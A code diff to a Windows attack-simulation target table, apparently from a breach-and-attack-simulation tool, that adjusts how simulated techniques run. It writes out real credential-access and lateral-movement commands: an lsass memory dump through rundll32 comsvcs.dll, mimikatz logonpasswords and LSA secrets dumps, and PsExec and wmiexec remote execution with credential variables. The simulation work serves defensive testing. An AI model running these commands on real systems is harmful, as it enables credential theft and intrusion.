@@ -14,6 +14,15 @@ Mirrors the canonical Windows shape (BlackMatter-style):
                                 OR ("File created:" AND
                                     ("Scenarios" OR "Simulation"))))
     play_processes:   {play_path} {play_arguments}      (per-target)
+                      play_path is a bare exe name (reg.exe, cmd.exe) for anything
+                      on PATH, or '%TMP%\\tool.exe' for a payload this action drops.
+                      Never an absolute path to a binary already on PATH -- that
+                      makes the Windows agent run nothing (command=" ", no output).
+                      Measured over Picus's 2508 predefined Windows processes:
+                      bare name 75.8%, %ENV%\\file 23.2%, absolute 0.9% (and all
+                      23 of those are binaries not reachable by name).
+                      cmd.exe /c is only for genuine shell syntax: a pipe, &&,
+                      a redirect, or an inner quoted command.
     rewind_processes: {predefined-file-delete} <dropper>
                       {predefined-process-kill} <process>
 
@@ -60,8 +69,8 @@ WINDOWS_TARGET_TABLE: list[TargetRow] = [
         tactic="TA0006", technique="T1003", sub_technique="T1003.001",
         ukc_phase="Credential Access", is_privileged=True,
         expected_output="Dump 1 complete",
-        play_path="C:\\Windows\\System32\\rundll32.exe",
-        play_arguments='comsvcs.dll, MiniDump {pid} C:\\Temp\\lsass.dmp full',
+        play_path="rundll32.exe",
+        play_arguments='comsvcs.dll, MiniDump {pid} "%TMP%\\lsass.dmp" full',
     ),
     TargetRow(
         target_regex="mimikatz",
@@ -70,7 +79,7 @@ WINDOWS_TARGET_TABLE: list[TargetRow] = [
         tactic="TA0006", technique="T1003", sub_technique="T1003.001",
         ukc_phase="Credential Access", is_privileged=True,
         expected_output="Authentication Id",
-        play_path="C:\\Tools\\mimikatz.exe",
+        play_path="%TMP%\\mimikatz.exe",
         play_arguments='privilege::debug sekurlsa::logonpasswords exit',
     ),
     TargetRow(
@@ -100,7 +109,7 @@ WINDOWS_TARGET_TABLE: list[TargetRow] = [
         tactic="TA0006", technique="T1003", sub_technique="T1003.004",
         ukc_phase="Credential Access", is_privileged=True,
         expected_output="Key Content",
-        play_path="C:\\Tools\\mimikatz.exe",
+        play_path="%TMP%\\mimikatz.exe",
         play_arguments='privilege::debug lsadump::secrets exit',
     ),
 
@@ -256,23 +265,25 @@ WINDOWS_TARGET_TABLE: list[TargetRow] = [
     TargetRow(
         target_regex="psexec",
         canonical_path="C:\\Tools\\psexec.exe",
+        # dropped tool -> it IS the path; peer + creds come from the %REMOTE*% vars
         display_name="PsExec Lateral Movement",
         tactic="TA0008", technique="T1021", sub_technique="T1021.002",
         ukc_phase="Lateral Movement", is_privileged=True,
         expected_output="started on",
-        play_path="C:\\Tools\\psexec.exe",
-        play_arguments='\\\\REMOTEHOST -u Administrator -p P@ssw0rd cmd.exe',
+        play_path="%TMP%\\psexec.exe",
+        play_arguments='\\\\%REMOTEHOSTNAME% -u %REMOTEDOMAIN%\\%REMOTEUSERNAME% -p %REMOTEPASSWORD% cmd.exe /c whoami',
         category="Lateral Movement Techniques",
     ),
     TargetRow(
         target_regex="wmiexec",
         canonical_path="C:\\Tools\\wmiexec.exe",
+        # dropped tool -> it IS the path; peer + creds come from the %REMOTE*% vars
         display_name="WMI Lateral Execution",
         tactic="TA0008", technique="T1021", sub_technique="T1021.006",
         ukc_phase="Lateral Movement", is_privileged=True,
         expected_output="command finished",
-        play_path="C:\\Tools\\wmiexec.exe",
-        play_arguments='Administrator:P@ssw0rd@REMOTEHOST "whoami"',
+        play_path="%TMP%\\wmiexec.exe",
+        play_arguments='%REMOTEDOMAIN%/%REMOTEUSERNAME%:%REMOTEPASSWORD%@%REMOTEIP% "whoami"',
         category="Lateral Movement Techniques",
     ),
 ]
